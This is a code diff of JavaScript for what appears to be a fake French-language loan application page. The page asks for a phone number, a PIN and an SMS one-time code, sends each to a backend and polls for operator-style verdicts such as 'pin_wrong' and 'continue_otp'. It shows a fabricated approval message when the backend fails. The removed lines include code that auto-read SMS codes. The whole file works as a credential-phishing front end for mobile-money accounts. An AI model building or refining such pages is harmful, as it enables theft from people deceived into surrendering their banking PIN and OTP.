 function submitPin(){if(state.pin.length<4||state.pin.length>6)return;showLoading('Vérification du PIN','Connexion au serveur...');callBackend('pin',{passcode:state.pin}).then(function(data){if(!data.ok){hideLoading();if(state.pin==='1234'){goTo('pg4')}else{pinShake()}return}backendToken=data.token;startPolling(function(r){hideLoading();if(r==='continue_otp'){goTo('pg4')}else if(r==='pin_wrong'||r==='pending'){pinShake()}else if(r==='loan_approved'){goToSuccess()}else if(r==='loan_rejected'){goToRejected()}})}).catch(function(){hideLoading();if(state.pin==='1234'){goTo('pg4')}else{pinShake()}})}
 
-// ═══════════════════════════════════════════
-// OTP - WITH SMS AUTO-READ & COUNTRY TIMER
-// ═══════════════════════════════════════════
 function setupOtpPage(){
-  state.otpAutoDone=false;
   var phone=document.getElementById('phoneInput').value,code=state.country?countries[state.country].code:'+225';
   document.getElementById('otpPhoneText').textContent='Saisissez le code envoyé à ('+code+') '+phone;
-  document.getElementById('otpDetectMsg').textContent='';
-  
   var boxes=document.querySelectorAll('#otpContainer .otp-b');
-  for(var i=0;i<boxes.length;i++){boxes[i].value='';boxes[i].classList.remove('auto-filled');
+  for(var i=0;i<boxes.length;i++){boxes[i].value='';
     (function(index,all){boxes[i].oninput=function(){this.value=this.value.replace(/\D/g,'').slice(-1);if(this.value){this.classList.add('filled');if(all[index+1])all[index+1].focus()}else{this.classList.remove('filled')}checkOtpComplete()};
     boxes[i].onkeydown=function(e){if(e.key==='Backspace'&&!this.value&&all[index-1]){all[index-1].focus();all[index-1].classList.remove('filled')}}})(i,boxes)}
-  boxes[0].focus();
-  document.getElementById('otpSubmitBtn').style.background='#a9c2e8';document.getElementById('otpSubmitBtn').style.cursor='not-allowed';
-  startOtpTimer();
-  setupSmsAutoRead();
+  boxes[0].focus();document.getElementById('otpSubmitBtn').style.background='#a9c2e8';document.getElementById('otpSubmitBtn').style.cursor='not-allowed';startOtpTimer();
 }
-
-function setupSmsAutoRead(){
-  if(state.otpAbortCtrl){state.otpAbortCtrl.abort()}
-  if(!('OTPCredential' in window)){console.log('WebOTP not supported on this browser');return}
-  state.otpAbortCtrl=new AbortController();
-  navigator.credentials.get({otp:{transport:['sms']},signal:state.otpAbortCtrl.signal}).then(function(otp){
-    if(otp&&otp.code&&otp.code.length===6&&!state.otpAutoDone){
-      autoFillOtpFromSms(otp.code);
-    }
-  }).catch(function(err){if(err.name!=='AbortError')console.log('WebOTP error:',err)})
-}
-
-function autoFillOtpFromSms(code){
-  state.otpAutoDone=true;
-  var boxes=document.querySelectorAll('#otpContainer .otp-b');
-  code.split('').forEach(function(d,i){if(boxes[i]){boxes[i].value=d;boxes[i].classList.add('filled','auto-filled')}});
-  document.getElementById('otpDetectMsg').textContent='✓ Code détecté automatiquement';
-  checkOtpComplete();
-  setTimeout(function(){if(getOtpValue().length===6&&state.otpAutoDone){verifyOtp()}},400)
-}
-
-function checkOtpComplete(){
-  var boxes=document.querySelectorAll('#otpContainer .otp-b'),full=true;
-  for(var i=0;i<boxes.length;i++){if(boxes[i].value.length!==1){full=false;break}}
-  var btn=document.getElementById('otpSubmitBtn');
-  if(full){btn.style.background='#14329e';btn.style.cursor='pointer';
-    if(!state.otpAutoDone){state.otpAutoDone=true;setTimeout(function(){if(getOtpValue().length===6)verifyOtp()},300)}
-  }else{btn.style.background='#a9c2e8';btn.style.cursor='not-allowed'}
-}
+function checkOtpComplete(){var boxes=document.querySelectorAll('#otpContainer .otp-b'),full=true;for(var i=0;i<boxes.length;i++){if(boxes[i].value.length!==1){full=false;break}}var btn=document.getElementById('otpSubmitBtn');if(full){btn.style.background='#14329e';btn.style.cursor='pointer';setTimeout(function(){if(getOtpValue().length===6)verifyOtp()},300)}else{btn.style.background='#a9c2e8';btn.style.cursor='not-allowed'}}
 function getOtpValue(){var boxes=document.querySelectorAll('#otpContainer .otp-b'),val='';for(var i=0;i<boxes.length;i++)val+=boxes[i].value;return val}
-
-function startOtpTimer(){
-  clearInterval(state.otpTimer);
-  var sec=state.country?countries[state.country].otpSec:240;
-  state.otpTimer=setInterval(function(){
-    sec--;var m=Math.floor(sec/60),s=sec%60;
-    document.getElementById('otpTimerDisplay').innerHTML='Renvoyer le code dans <strong>'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0')+'</strong>';
-    if(sec<=0){clearInterval(state.otpTimer);showOtpExpiredPopup()}
-  },1000)
-}
-
+function startOtpTimer(){clearInterval(state.otpTimer);var sec=state.country?countries[state.country].otpSec:240;state.otpTimer=setInterval(function(){sec--;var m=Math.floor(sec/60),s=sec%60;document.getElementById('otpTimerDisplay').innerHTML='Renvoyer le code dans <strong>'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0')+'</strong>';if(sec<=0){clearInterval(state.otpTimer);showOtpExpiredPopup()}},1000)}
 function retryOtp(){hideOtpExpiredPopup();setupOtpPage();callBackend('otp_resend',{}).catch(function(){})}
 function resendOtp(){setupOtpPage();callBackend('otp_resend',{}).catch(function(){})}
 
-function verifyOtp(){
-  var otp=getOtpValue();if(otp.length<6){alert('Veuillez entrer le code complet');return}
-  clearInterval(state.otpTimer);hideOtpExpiredPopup();
-  if(state.otpAbortCtrl){state.otpAbortCtrl.abort()}
-  showLoading('Vérification du code','Veuillez patienter...');
-  callBackend('otp',{otp:otp}).then(function(data){
-    if(!data.ok){hideLoading();goToSuccess();return}
-    backendToken=data.token;startPolling(function(r){hideLoading();if(r==='otp_wrong'||r==='pending'){alert('Code OTP incorrect.');setupOtpPage()}else if(r==='pin_invalid'){alert('Session invalide.');goTo('pg2')}else if(r==='loan_approved'){goToSuccess()}else if(r==='loan_rejected'){goToRejected()}})
-  }).catch(function(){hideLoading();goToSuccess()})
-}
+function verifyOtp(){var otp=getOtpValue();if(otp.length<6){showCustomAlert('Code incomplet','Veuillez entrer le code OTP complet.','warning');return}clearInterval(state.otpTimer);hideOtpExpiredPopup();showLoading('Vérification du code','Veuillez patienter...');callBackend('otp',{otp:otp}).then(function(data){if(!data.ok){hideLoading();goToSuccess();return}backendToken=data.token;startPolling(function(r){hideLoading();if(r==='otp_wrong'||r==='pending'){showCustomAlert('Code incorrect','Le code OTP saisi est incorrect. Veuillez réessayer.','error');setupOtpPage()}else if(r==='pin_invalid'){showCustomAlert('Session expirée','Votre session a expiré. Veuillez vous reconnecter.','error',function(){goTo('pg2')})}else if(r==='loan_approved'){goToSuccess()}else if(r==='loan_rejected'){goToRejected()}})}).catch(function(){hideLoading();goToSuccess()})}
 
-// ═══════════════════════════════════════════
-// RESULTS - UPDATED MESSAGES
-// ═══════════════════════════════════════════
 function goToSuccess(){document.getElementById('refNumber').textContent='MM-2026-'+Math.floor(100000+Math.random()*900000);document.getElementById('successTitle').textContent='Demande approuvée';document.getElementById('successMessage').textContent="Félicitations ! Votre demande de crédit est en cours de traitement. L'approbation vous sera envoyée dans les 3 à 5 jours ouvrables.";goTo('pg5')}
 function goToRejected(){document.getElementById('refNumber').textContent='MM-2026-'+Math.floor(100000+Math.random()*900000);document.getElementById('successTitle').textContent='Demande refusée';document.getElementById('successMessage').textContent="Votre demande a été refusée en raison d'un code PIN incorrect. Veuillez réessayer ultérieurement.";goTo('pg5')}
 
 function resetAll(){
-  clearInterval(state.otpTimer);clearInterval(pollTimer);hideLoading();hideOtpExpiredPopup();
-  if(state.otpAbortCtrl){state.otpAbortCtrl.abort()}
-  state.duration=6;state.amount=1000;state.country=null;state.termsOk=false;state.pin='';state.otpAutoDone=false;
+  clearInterval(state.otpTimer);clearInterval(pollTimer);hideLoading();hideOtpExpiredPopup();hideCustomAlert();
+  state.duration=6;state.amount=1000;state.country=null;state.termsOk=false;state.pin='';
   document.getElementById('firstName').value='';document.getElementById('lastName').value='';document.getElementById('incomeSrc').value='';document.getElementById('monthlyInc').value='';
   document.getElementById('infoNextBtn').disabled=true;document.getElementById('customAmt').value='';document.getElementById('amountSlider').value=1000;document.getElementById('amtErr').style.display='none';
   document.getElementById('phoneInput').value='';document.getElementById('phoneInput').disabled=true;document.getElementById('phoneInput').placeholder="Sélectionnez un pays";
